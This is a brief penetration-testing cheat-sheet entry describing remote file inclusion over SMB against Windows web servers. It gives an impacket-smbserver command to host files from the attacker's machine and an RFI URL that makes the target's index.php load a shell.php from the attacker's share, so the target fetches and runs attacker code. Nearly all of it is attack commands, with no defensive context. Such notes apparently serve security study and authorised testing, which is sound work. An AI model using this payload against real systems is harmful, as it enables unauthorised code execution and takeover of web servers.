---
tags:
  - Execution
  - Exploitation
  - Foundational
  - Initial_Access
  - Web_Application
---

### SMB-Based RFI (Windows Targets) [alternative]
> [!tip] Use SMB instead of HTTP for Windows targets.

#### Start SMB Server [Local]
```bash
impacket-smbserver share . -smb2support
```

#### Include via SMB
```
http://<Target>/index.php?page=\\<AttackerIP>\share\shell.php
```
